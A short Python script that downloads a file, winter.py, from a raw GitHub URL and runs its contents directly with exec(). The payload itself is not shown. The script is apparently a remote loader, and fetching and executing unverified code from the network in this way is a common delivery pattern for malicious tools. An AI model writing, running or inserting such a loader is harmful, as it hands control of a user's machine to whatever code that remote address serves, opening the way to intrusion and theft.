import requests

get = requests.get("https://raw.githubusercontent.com/LyHoangKhangDVL/Cailoznem/main/winter.py").text
exec(get)